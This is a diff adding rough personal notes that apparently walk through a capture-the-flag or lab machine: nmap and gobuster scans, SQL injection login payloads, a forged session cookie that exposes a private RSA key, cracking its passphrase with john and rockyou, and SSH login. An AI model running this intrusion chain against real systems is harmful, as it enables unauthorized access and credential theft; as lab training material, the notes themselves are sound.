@@ -1,1 +1,25 @@
-
+1.) Used nmap to find open ports and more information on what services.
+  - nmap -sC -sV 10.10.49.212
+    - 22/tcp open
+    -80/tcp open
+2.) Used gobuster to find hidden directories 
+  - gobuster -dir -u http://10.10.49.212 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+    - adnmin found
+3.) go to admin directory
+  - tried sql injections in login like ' OR 1=1 -- or " OR=1 -- both username and password
+  - check page source
+    - found that the page source has a cookie vuln
+4.) curl the ip, check for cookie parameter
+  - needs a parameter, set the cookie value to anything i want
+  - private rsa key found
+  - go into console of the admin page, Cookies.set("SessionToken","anybvalue")
+    - shows rsa key on page 
+5.) put private rsa key into a file called id_rsa
+  - use john to covert it to something it could read
+    - ./ssh2john.py /root/id_rsa > /root/hash.txt
+6.) then use john to find passwords for the hash file
+  - john --wordlists=/usr/share/wordlists/rockyou.txt /root/hash.txt
+    - pw = james13 
+7.) login ssh 
+  - ssh -i id_rsa james@10.10.49.212
+    -use pw to login
